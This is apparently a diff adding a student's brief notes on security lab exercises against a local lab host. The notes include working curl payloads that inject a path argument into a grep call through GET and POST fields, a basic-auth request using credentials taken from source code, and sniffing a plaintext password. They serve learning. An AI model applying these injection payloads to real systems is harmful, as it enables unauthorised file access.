@@ -543,3 +543,30 @@ done
 ### lab 4d.3 - off by one pivot
 
 honestly idk just check class vid and script
+
+### lab 5a.1 - get command injection
+
+- unsanitized url query param as grep input
+- string is in double quotes
+- `curl 'http://lab.localhost?username=pwn.*"+"/flag'`
+  - double quotes to break the string input
+  - `+` to insert space after name in grep
+  - add target path to search in
+
+### lab 5a.2 - post command injection
+
+- similar, except post request this time
+- string is in single quotes
+- `curl -X POST 'http://lab.localhost' -d "username=pwn.*'+'/flag"`
+
+### lab 5a.3 - basic authentication
+
+- basic auth, creds in source code
+- format: `<username>:<password>` and it has to be base64 encoded
+- `curl 'http://lab.localhost' -H "Authorization: Basic $(printf "0c001:acidburn" | base64)"`
+- or easier: `curl 'http://lab.localhost' -u "0c001:acidburn"`
+
+### lab 5a.4 - session hijack
+
+- not really session hijack, flag is the password, sent in plaintext
+- tcpdump access given, done
